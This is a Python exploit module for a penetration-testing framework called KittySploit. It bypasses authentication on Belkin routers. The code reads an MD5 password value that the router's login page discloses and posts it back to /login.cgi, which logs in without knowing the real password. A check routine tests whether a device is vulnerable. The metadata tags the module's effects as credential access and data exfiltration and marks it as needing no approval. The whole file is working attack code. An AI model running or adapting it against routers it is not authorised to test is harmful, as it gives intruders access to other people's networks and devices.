#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Belkin Auth Bypass"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Belkin Auth Bypass',
        'description': 'Module exploits Belkin authentication using MD5 password disclosure.',
        'author': ['Gregory Smiley', 'BigNerd95 (Lorenzo Santina)'],
        
        'platform': Platform.LINUX,
        'references': ['https://securityevaluators.com/knowledge/case_studies/routers/belkin_n900.php', 'https://www.exploit-db.com/exploits/40081/'],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            payload = "pws=" + val[0] + "&arc_action=login&action=Submit"

            login = self.http_request(
                method="POST",
                path="/login.cgi",
                data=payload
            )
            if login is None:
                return

            error = re.search('loginpserr.stm', login.text)

            if not error:
                print_success("Exploit success, you are now logged in!")
                return

        print_error("Exploit failed. Device seems to be not vulnerable.")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable
